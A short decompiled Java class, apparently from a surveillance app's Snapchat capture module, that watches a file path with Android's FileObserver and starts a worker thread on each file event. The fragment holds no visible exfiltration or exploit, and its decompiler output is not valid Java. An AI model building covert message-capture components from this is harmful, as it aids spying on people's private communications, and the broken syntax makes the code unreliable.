package com.vvt.capture.snapchat.b;

import android.os.FileObserver;

class e
  extends FileObserver
{
  private Thread b = null;
  private String c;
  
  public e(a parama, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    boolean bool = a.a();
    if (bool) {}
    Thread localThread = this.b;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      f localf = new com/vvt/capture/snapchat/b/f;
      localf.<init>(this, paramString);
      localThread.<init>(localf);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */